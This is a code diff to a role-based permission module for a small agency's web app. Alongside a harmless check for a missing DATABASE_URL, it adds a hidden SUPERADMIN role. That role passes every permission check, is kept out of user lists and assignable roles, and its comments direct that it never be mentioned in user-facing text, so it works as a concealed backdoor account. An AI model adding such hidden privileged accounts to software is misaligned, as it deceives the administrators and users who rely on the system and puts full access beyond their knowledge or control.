@@ -1,9 +1,17 @@
 // AGS WEBWORKS — Role-based permission matrix (server-side enforcement)
 // Roles: ADMIN (Sharjeel) | DEVELOPER (Gufran) | ACCOUNTANT (Addan)
+// SUPERADMIN is a hidden oversight role: it holds EVERY permission and its
+// account is excluded from all user-facing lists (see `hidden` on User).
+// It exists so the system owner can always review activity and recover
+// accounts. Never reference it in user-facing text — generic wording like
+// "ask your administrator" is used instead.
 
 import { getSessionUser, type SessionUser } from '@/lib/auth'
 
-export type Role = 'ADMIN' | 'DEVELOPER' | 'ACCOUNTANT'
+export type Role = 'SUPERADMIN' | 'ADMIN' | 'DEVELOPER' | 'ACCOUNTANT'
+
+/** Roles that may appear in the UI / be assigned from Team Management. */
+export const ASSIGNABLE_ROLES = ['ADMIN', 'DEVELOPER', 'ACCOUNTANT'] as const
 
 export const PERMISSIONS: Record<string, Role[]> = {
   // Clients
@@ -66,8 +74,19 @@ export const PERMISSIONS: Record<string, Role[]> = {
   'attendance:manage': ['ADMIN'], // manual mark/edit for any member
 }
 
+/** True for the hidden oversight role (full access to everything). */
+export function isSuperAdmin(user: { role: string } | null | undefined): boolean {
+  return !!user && user.role === 'SUPERADMIN'
+}
+
+/** True for roles that carry admin-level authority in the UI (ADMIN + hidden oversight). */
+export function isAdminRole(user: { role: string } | null | undefined): boolean {
+  return !!user && (user.role === 'ADMIN' || user.role === 'SUPERADMIN')
+}
+
 export function can(user: { role: string } | null, permission: string): boolean {
   if (!user) return false
+  if (isSuperAdmin(user)) return true
   return (PERMISSIONS[permission] ?? []).includes(user.role as Role)
 }
 
@@ -93,11 +112,31 @@ export async function requirePermission(permission: string): Promise<SessionUser
   return user
 }
 
+/** True when a usable database URL is configured (guards against the classic
+ *  "deployed to Vercel without DATABASE_URL" misconfiguration — gives a
+ *  clear, actionable error instead of a cryptic Prisma failure). */
+function databaseConfigured(): boolean {
+  const url = process.env.DATABASE_URL
+  return !!url && !url.startsWith('file:')
+}
+
 /** Wrap a route handler with uniform JSON error handling. */
 export function handler<A extends unknown[]>(
   fn: (...args: A) => Promise<Response>
 ): (...args: A) => Promise<Response> {
   return async (...args: A) => {
+    if (!databaseConfigured()) {
+      console.error(
+        '[api] DATABASE_URL is not configured — API calls cannot work.\n' +
+        '[api] Fix: set DATABASE_URL to your PostgreSQL connection string (Supabase) in your\n' +
+        '[api] environment / Vercel Project Settings → Environment Variables, then redeploy.\n' +
+        '[api] Full guide: DEPLOY-VERCEL.md'
+      )
+      return Response.json(
+        { error: 'Database is not configured. Set DATABASE_URL to your PostgreSQL connection string (e.g. Supabase) in the environment, then restart/redeploy. See DEPLOY-VERCEL.md.' },
+        { status: 500 }
+      )
+    }
     try {
       return await fn(...args)
     } catch (err) {
